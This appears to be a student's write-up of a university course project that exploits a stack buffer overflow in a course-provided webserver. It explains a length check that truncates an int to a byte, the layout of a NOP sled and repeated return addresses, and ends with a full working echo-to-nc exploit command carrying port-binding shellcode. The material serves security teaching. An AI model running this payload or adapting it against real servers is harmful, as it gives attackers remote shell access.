# Smashing the Stack

In this project, we exploited a vulnerability in a remote webserver and successfully compromised it; the vulnerability we found was a class called **buffer overflows**. Essentially, a buffer overflow occurs when a buffer, such as an array, is filled with more bytes than it had allocated. When an *out of bounds* check doesn't happen, we can overwrite saved registers on the stack such as the return address. By therefore filling the buffer with executable instructions (shellcode) and overwriting the return address to the beginning of our shellcode, we can spawn a new shell that attacks the server.

### Project specification
https://lpc.cs.duke.edu/compsci310/projects/p2.php

### The shellcode
The shellcode basically spawns a new shell (portbinds it by calling ```execve```)
https://users.cs.duke.edu/~chase/cps310/shellcode.html

### The vulnerability
The vulnerability was in the ```check_filename_length``` call in the ```handle``` function, where the length, which was of type ```int``` was sent to a method with argument type ```byte```, and so only the last 8 bits of the string are considered. As long as the length has a binary value where the last 8 bits are less than 100 -- or in more precise terms, lengths which are in the range 256n to 256n + 100 will pass the test. We used a string of length 828 which passes the test.


### The attack
The next challenge was to attack the server. We created an attack string composed of multiple copies of the return address, a no-op sled, and then the shellcode. We were hoping that when when our return address overwrites the pre-existing return address, it will point to the no-op sled, which would then slide down right into our shellcode to spawn the shell. The reason we repeat the address is so that we can overflow the stack frame and maximize our chances of replacing the original return address. Knowing the return address was about 140 bytes, we made sure to create more than 35 copies of our return address (since each address is four bytes).

Our attack string was a GET request of length 828. We had 72 copies of our return address, for 288 bytes. The next thing that followed was 448 no-ops. And finally, the shellcode from the link above which actually spawns the shell was 92 bytes.
Our return address was ```0xbffffdb4```. It was a complete random guess because we knew the start of the stack was ```0xbfffffff```, and the return address should be close to it. Represented in shellcode, it should be ```\xb4\xfd\xff\xbf``` due to the Endianness.
Then our no-ops followed with ```0x90```, and finally the shellcode found above. This allowed us to smash the stack, ```cd``` into the directory, and edit the ```index.html``` file.

Our entire attack string is below:

```echo -e "GET /\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\xb4\xfd\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x27\x56\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP" | nc 310test.cs.duke.edu 9288```

This was a great project and we learned a lot about stack smashing from reading the articles.